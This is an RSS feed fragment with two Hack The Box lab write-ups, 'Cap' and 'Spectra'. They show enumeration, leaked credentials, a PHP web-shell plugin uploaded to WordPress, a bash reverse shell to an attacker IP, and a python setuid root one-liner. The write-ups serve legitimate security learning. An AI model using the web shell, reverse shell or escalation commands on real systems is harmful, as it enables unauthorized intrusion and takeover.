<p><img src="/img/cap/Pasted_image_20210717190340.png" alt="/img/cap/Pasted_image_20210717190340.png"></p>
</li>
</ul>
<p>We get FTP id and password</p>
<pre><code>nathan:Buck3tH4TF0RM3!
</code></pre><h1 id="exploitation">Exploitation</h1>
<h2 id="getting-shell">Getting shell</h2>
<p>Using these credentials to login in using SSH, we get a shell</p>
<p><img src="/img/cap/Pasted_image_20210717190453.png" alt="/img/cap/Pasted_image_20210717190453.png"></p>
<h1 id="post-exploit-enumeration---user-level">Post Exploit Enumeration - User level</h1>
<p><img src="/img/cap/Pasted_image_20210721202213.png" alt="/img/cap/Pasted_image_20210721202213.png"></p>
<p>Linux Capabilities: <em>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</em></p>
<p>Further Reading → <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></p>
<h1 id="exploitation-1">Exploitation</h1>
<pre><code>python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);'
</code></pre><p><img src="/img/cap/Pasted_image_20210722000148.png" alt="/img/cap/Pasted_image_20210722000148.png"></p>
<p><img src="/img/cap/Pasted_image_20210722000201.png" alt="/img/cap/Pasted_image_20210722000201.png"></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Spectra - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-spectra/</link>
            <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-spectra/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229 Nmap scan report for 10.10.10.229 Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn&#39;t have a title (text/html). 3306/tcp open mysql? |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed.</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
# Nmap done at Sat Jun 12 00:01:05 2021 -- 1 IP address (1 host up) scanned in 109.31 seconds

</code></pre><p><strong>Summary</strong></p>
<ul>
<li>Ports opened -&gt; 22, 80, 3306</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<p>Landing page:</p>
<p><img src="/img/spectra/Pasted_image_20210612000503.png" alt="/img/spectra/Pasted_image_20210612000503.png"></p>
<p>Source code:</p>
<p><img src="/img/spectra/Pasted_image_20210612000522.png" alt="/img/spectra/Pasted_image_20210612000522.png"></p>
<p>This uses <code>http://spectra.htb/</code> instead of the IP, so we modify in our <code>/etc/hosts</code> file as well</p>
<pre><code>$ cat /etc/hosts | grep spectra.htb
10.10.10.229    spectra.htb
</code></pre><h3 id="main">/main</h3>
<p>Landing page</p>
<p><img src="/img/spectra/Pasted_image_20210612000654.png" alt="/img/spectra/Pasted_image_20210612000654.png"></p>
<p>It&rsquo;s a wordpress site.</p>
<ul>
<li>wpscan does not reveal anything interesting.</li>
</ul>
<h3 id="testing">/testing</h3>
<ul>
<li>Error establishing database connection</li>
</ul>
<p>Running ffuf</p>
<pre><code>$ ffuf -u &lt;http://spectra.htb/testing/FUZZ&gt; -w /usr/share/wordlists/dirb/common.txt -r -v -c -ic -e .php,.txt -of html -o http/http-80-common-testing.html

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://spectra.htb/testing/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt
 :: Output file      : http/http-80-common-testing.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 2514, Words: 1130, Lines: 27]
| URL | &lt;http://spectra.htb/testing/&gt;
    * FUZZ:

[Status: 200, Size: 19915, Words: 3331, Lines: 385]
| URL | &lt;http://spectra.htb/testing/license.txt&gt;
    * FUZZ: license.txt

[Status: 200, Size: 11460, Words: 5252, Lines: 102]
| URL | &lt;http://spectra.htb/testing/wp-admin&gt;
    * FUZZ: wp-admin

[Status: 200, Size: 627, Words: 259, Lines: 11]
| URL | &lt;http://spectra.htb/testing/wp-content&gt;
    * FUZZ: wp-content

[Status: 200, Size: 585, Words: 50, Lines: 7]
| URL | &lt;http://spectra.htb/testing/wp-settings.php&gt;
    * FUZZ: wp-settings.php

[Status: 200, Size: 25891, Words: 10424, Lines: 215]
| URL | &lt;http://spectra.htb/testing/wp-includes&gt;
    * FUZZ: wp-includes

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

:: Progress: [13842/13842] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:45] :: Errors: 0 ::

</code></pre><ul>
<li>
<p>Going to <code>/testing/wp-admin</code> displays all the files in that directory. Perhaps, directory listing is turned on.</p>
<p><img src="/img/spectra/Pasted_image_20210617193018.png" alt="/img/spectra/Pasted_image_20210617193018.png"></p>
</li>
<li>
<p>Instead of going to <code>/testing/index.php</code> -&gt; <code>/testing/</code> gives us all the files there.</p>
<p><img src="/img/spectra/Pasted_image_20210617193216.png" alt="/img/spectra/Pasted_image_20210617193216.png"></p>
</li>
</ul>
<p>==Should try <em>.php.save</em> during directory brute forcing as well==</p>
<p>Seeing the source code of <code>wp-config.php.save</code> gives DB credentials</p>
<p><img src="/img/spectra/Pasted_image_20210617193453.png" alt="/img/spectra/Pasted_image_20210617193453.png"></p>
<pre><code>define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

</code></pre><p>Using this credentials to login as <code>administrator</code> on <code>http://spectra.htb/main/wp-admin/login.php</code> and we are in.</p>
<p><img src="/img/spectra/Pasted_image_20210617193948.png" alt="/img/spectra/Pasted_image_20210617193948.png"></p>
<p>Going to theme editor and updating 404.php</p>
<p><img src="/img/spectra/Pasted_image_20210617194207.png" alt="/img/spectra/Pasted_image_20210617194207.png"></p>
<p>Error:</p>
<p><img src="/img/spectra/Pasted_image_20210617194410.png" alt="/img/spectra/Pasted_image_20210617194410.png"></p>
<h3 id="getting-shell-by-uploading-plugin">Getting shell by uploading plugin</h3>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ cat rev.php
&lt;?php

/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: fake_batman_
 */
    system($_REQUEST['cmd']);

?&gt;
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ zip rev.zip rev.php
updating: rev.php (deflated 3%
</code></pre><p><img src="/img/spectra/Pasted_image_20210617203800.png" alt="/img/spectra/Pasted_image_20210617203800.png"></p>
<p>Upload the plugin.</p>
<p>Go to <code>view-source:&lt;http://spectra.htb/main/wp-content/plugins/rev/rev.php?cmd=id&gt;</code></p>
<p>And we get RCE</p>
<p><img src="/img/spectra/Pasted_image_20210617204606.png" alt="/img/spectra/Pasted_image_20210617204606.png"></p>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.28/4444 0&gt;&amp;1

</code></pre><h1 id="escalating-to-user">Escalating to user</h1>
<p><img src="/img/spectra/Pasted_image_20210617213606.png" alt="/img/spectra/Pasted_image_20210617213606.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213634.png" alt="/img/spectra/Pasted_image_20210617213634.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213655.png" alt="/img/spectra/Pasted_image_20210617213655.png"></p>
<p>The password <code>SummerHereWeCome!!</code> works for katie. Hehe!</p>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ ssh katie@spectra.htb
Password:
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt
e89d27fe195e911*****************
</code></pre><h2 id="escalating-to-the-root">Escalating to the root</h2>
<p>We are use <code>katie</code> and need to get root.</p>
<h3 id="sudo--l-output"><code>sudo -l</code> output</h3>
<pre><code>katie@spectra /dev/shm $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

</code></pre><p>Getting to root -&gt; <a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9">https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9</a></p>
<h3 id="linpeassh-interesting-screenshots">linpeas.sh interesting screenshots</h3>
<p><img src="/img/spectra/Pasted_image_20210618001207.png" alt="/img/spectra/Pasted_image_20210618001207.png"></p>
<p>katie is in group <code>developers</code></p>
<p><img src="/img/spectra/Pasted_image_20210618001309.png" alt="/img/spectra/Pasted_image_20210618001309.png"></p>
]]></content>
        </item>
        
    </channel>
</rss>
